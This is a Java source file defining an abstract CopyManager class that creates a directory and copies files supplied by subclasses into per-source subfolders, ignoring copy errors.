package org.spray.darkeye.managers;

import java.io.File;
import java.io.IOException;
import java.util.List;

import org.spray.darkeye.objects.Data;

import com.google.common.io.Files;

public abstract class CopyManager implements IManager {

	private String path;

	public CopyManager(String path) {
		this.path = path;
	}

	@Override
	public void run() {
		File dir = new File(path, getPath());
		if (!dir.exists())
			dir.mkdirs();

		getData().forEach(data -> {
			data.getFiles().forEach(fileData -> {
				try {
					File implDir = new File(dir, data.getName());
					
					if (!fileData.getFile().exists())
						return;

					if (!implDir.exists())
						implDir.mkdirs();

					Files.copy(fileData.getFile(), new File(implDir, fileData.getName()));
				} catch (IOException e) {
					// File not found
				}
			});
		});
	}

	@Override
	public abstract String getPath();

	protected abstract List<Data> getData();
}
